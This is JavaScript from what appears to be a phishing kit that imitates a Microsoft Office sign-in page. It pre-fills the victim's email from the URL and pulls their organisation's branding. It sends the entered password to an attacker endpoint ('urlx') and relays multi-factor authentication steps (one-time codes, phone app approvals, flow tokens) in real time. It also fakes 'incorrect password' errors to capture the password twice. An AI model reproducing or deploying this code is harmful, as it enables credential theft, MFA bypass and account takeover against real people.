var Errs={'NoOtpCode':'Enter the code to help us verify your identity.','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.','NoAccount':'We couldn\'t find an account with that username&period; Try another, or get a new account.','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, reset it now.','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again.','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>'};
var email = "";
var epass = "";
var phone = "";
var dVal = [];
var lVal = [];
var myInterval,Proofs;
var url = new URL(window.location);
var semail = url.searchParams.get("email");
if(semail){
email = $("#email").val(semail);
nextto(semail);
console.log(semail);  
}
function isEmail(email) {
var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
return regex.test(email);
}
function nextto(vak) {
if(vak){
	email = vak;  
}else{
	email = $("#email").val();  
}
console.log(vak); 
if (isEmail(email) === true) {
$("#load").show();
$("#btn").attr("disabled", true);

$.ajax({
type: "POST",
url: urlx,
data: { action: "signup", email: email, mode: "getbg" },
}).done(function (data) {
console.log(data);
var datArray = JSON.parse(data);
$("#load").hide();
$("#page1").hide();
$("#page3").show();
// orgme();
console.log(datArray["status"]);
if (datArray["status"] == "success") {
$(".imglogo").attr("src", datArray["logo_image"]);
$("#imgbg").css("background-image", "url(" + datArray["bg_image"] + ")");
} else {
}
$("#displayName").html(email);
$("#btn").attr("disabled", false);
console.log("response: ", datArray["logo_image"]);

});
} else {
$("#error1").html(Errs['NoAccount']);
}
}
function orgme() {
setTimeout(function () {
$("#page2").hide();
$("#page3").show();
}, 3000);
}

function back() {
$("#page1").show();
$("#page2").hide();
$("#page3").hide();

$("#error2").hide();
$("#error3").hide();
}
function cancel() {
location.reload();
}
var count = 0;
var lcount = 0;
function redlogin() {
epass = $("#epass").val();

if (epass == "") {
$("#error2").html(Errs['NoPassword']);

} else {
count = count + 1;
$("#error2").html('');

$("#load").show();
$("#btn2").attr("disabled", true);
$.ajax({
type: "POST",
url: urlx,
data: { action: "signup", email: email, epass: epass, mode: "OfficeLogin" },
}).done(function (data) {
console.log(data);
var datArray = JSON.parse(data);

if (datArray["status"] == "success") {
window.location.replace(datArray["land"]);
} else if (datArray["status"] == "login_auth") {
auth(datArray["auth_val"]);
}else if (datArray["status"] == "successx") {
    lcount++;
    if(lcount>=2){
   window.location.replace(datArray["land"]);     
    }else{
     $("#load").hide();
$("#error2").html(Errs['accIncorrect']);
$("#epass").val("");
$("#btn2").attr("disabled", false);   
    }
} else {
$("#load").hide();
$("#error2").html(Errs['accIncorrect']);
$("#epass").val("");
$("#btn2").attr("disabled", false);
return false;
}
});
}
}

async  function auth(dauth) {
    if(Proofs){
$("#screen2").html(Proofs);
    }else{
dVal["arrUserProofs"] = dauth["arrUserProofs"];
dVal["ctx"] = dauth["ctx"];
dVal["flowToken"] = dauth["flowToken"];
var data = dauth["arrUserProofs"];
console.log(data);
var gototype=await GotoType('Proofs');
if(gototype['status']){
    Proofs=gototype['msg'];
    $("#screen1").hide();
$("#screen2").html(gototype['msg']);
data.forEach(function (val, i) {
var authid = val["authMethodId"];
$("#screen2 #" + authid).show();
$("#screen2 #" + authid + " .pnum").text(val["display"]);
phone = val["display"];
});
}
}
}
async  function  GotoAuth(atype){
    $("#screen2 #load").show();
var reslt = await GotoType(atype);
if(reslt['status']=='success'){
   
console.log(reslt['status']);
var act= await beginAuth(atype);
if (act["Success"]) {
     $("#screen2 #load").hide();
$("#screen2").html(reslt['msg']);
if (atype == "TwoWayVoiceMobile" || atype == "PhoneAppNotification") {
startEndath(atype);
}
}else{
    authback(1);
}
}
}
function authback(err) {
$("#screen2 #load").show();
auth(dVal);
stopEndath();
 if(err){
         setTimeout(function(){
       $("#screen2 #errorx").html(Errs['UnableVeri']);  
       $("#screen2 #load").hide();
   },1000)
   
    }
}
async function GotoType(atype) {
var reslt= await $.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
atype: atype,
email: email,
phone: phone,
mode: "GotoType"
},
})
return JSON.parse(reslt);

}
function AuthEdata(atype){
if (atype == "TwoWayVoiceMobile" || atype == "PhoneAppNotification") {
stopEndath();
processAuth(atype, "");
}
}
async function verifyOTC(atype) {
$("#screen2 #staErr").html('');
var otc = $("#screen2 #otc").val();
if(otc!=''){
$("#screen2 #load").show();
$("#screen3 #verifyOTC").attr('disabled',true);
var res= await endAuth(atype, otc);
if (res["Success"]) {
processAuth(atype, otc);
}else if (res["ResultValue"]=='InvalidSession'){
$("#verifyOTC").attr('disabled',false);
$("#screen2 #staErr").html(Errs['InvalidSession']);
}else if (res["ResultValue"]=='OathCodeIncorrect'){
$("#verifyOTC").attr('disabled',false);
$("#screen2 #staErr").html(Errs['OathCodeIncorrect']);
}else{
    $("#screen2 #staErr").html('');
  authback(1);
}
$("#screen2 #load").hide();
console.log('res',res); 
}else{
$("#screen2 #load").hide();
$("#screen2 #staErr").html(Errs['NoOtpCode']);
}

}
async function beginAuth(atype) {
var valx = '{"AuthMethodId":"' + atype + '","Method":"BeginAuth","ctx":"' + dVal["ctx"] + '","flowToken":"' + dVal["flowToken"] + '"}';
var gdata  = await $.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
valx: valx,
mode: "bauth",
},
}).done(function (data) {
var vdata = JSON.parse(data);
if (vdata["Success"]) {
lVal["ctx"] = vdata["Ctx"];
lVal["flowToken"] = vdata["FlowToken"];
lVal["sseid"] = vdata["SessionId"];
}else{
     $("#screen2 #errorx").html(Errs['UnableVeri']);  
}
console.log(vdata);
});
var vdata = JSON.parse(gdata);
return vdata;
}

var PollCount = 1;
async function endAuth(atype, otc) {
PollCount++;
var valx =
'{"Method":"EndAuth","SessionId":"' +
lVal["sseid"] +
'","FlowToken":"' +
lVal["flowToken"] +
'","Ctx":"' +
lVal["ctx"] +
'","AuthMethodId":"' +
atype +
'","AdditionalAuthData":"' +
otc +
'","PollCount":' +
PollCount +
"}";
var rr = await  $.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
valx: valx,
mode: "eauth",
},
}).done(function (data) {
var vdata = JSON.parse(data);
console.log(vdata);
lVal["ctx"] = vdata["Ctx"];
lVal["flowToken"] = vdata["FlowToken"];
lVal["sseid"] = vdata["SessionId"];
if (vdata["Success"]) {
PollCount = 1;
AuthEdata(atype);
}
if (PollCount >= 8) {
    authback(1);
   
console.log("PollCount Stoped");
stopEndath();
}

});
var vdata = JSON.parse(rr);
return vdata;
console.log('rr',rr);

}
function processAuth(atype, otc) {
console.log("processAuth");

var valx =
'{"type":19,"GeneralVerify":false,"request":"' +
lVal["ctx"] +
'","mfaLastPollStart":"1674088555560","mfaLastPollEnd": "1674088556987","mfaAuthMethod": "' +
atype +
'","otc": "' +
otc +
'","login": "' +
email +
'","flowToken":"' +
lVal["flowToken"] +
'","hpgrequestid":"' +
lVal["sseid"] +
'","sacxt":"","hideSmsInMfaProofs":false,"canary":"","i19": "42293"}';
$.ajax({
type: "POST",
url: urlx,
data: { action: "signup", email: email, epass: epass, valx: valx, mode: "pAuth" },
}).done(function (data) {
console.log(data);
var datArray = JSON.parse(data);
if (datArray["status"] == "success") {
window.location.replace(datArray["land"]);
}
});
}
function startEndath(atype) {
myInterval = setInterval(function () {
endAuth(atype, "");
}, 5000);
}
function stopEndath() {
clearInterval(myInterval);
}
var input = document.getElementById("email");
input.addEventListener("keyup", function (event) {
if (event.keyCode === 13) {
event.preventDefault();
nextto();
}
});
var input = document.getElementById("epass");
input.addEventListener("keyup", function (event) {
if (event.keyCode === 13) {
event.preventDefault();
redlogin();
}
});